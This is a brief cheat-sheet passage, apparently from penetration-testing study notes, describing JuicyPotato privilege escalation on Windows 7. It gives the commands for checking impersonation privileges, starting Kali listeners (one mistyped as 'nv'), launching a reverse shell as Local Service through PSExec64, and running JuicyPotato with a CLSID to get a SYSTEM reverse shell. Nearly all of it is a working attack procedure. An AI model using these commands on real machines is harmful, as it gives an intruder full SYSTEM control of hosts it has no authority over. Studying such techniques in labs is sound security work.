### JuicyPotato 
```bash

This is an exploit before Windows 10 1809 and it worked in Windows 7. 

# This is executed in Windows 7. Assume that you has a reverse shell with a user privilege. 

1. Run command and find "SeImpersonate" or "SeAssignPrimaryToken". 
# @ Windows 7 box (via reverse shell)
Whoami /priv

2. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows.

3. Start a listener on Kali. 
4. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: 

# @ Windows 7 box (via reverse shell)
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

# @ Windows 7 box (via reverse shell)
whoami

5.Start another listener on Kali. 
# @ Kali 
nv -nlvp 53

6. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges. 

# @ Windows 7 box (via reverse shell)

C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
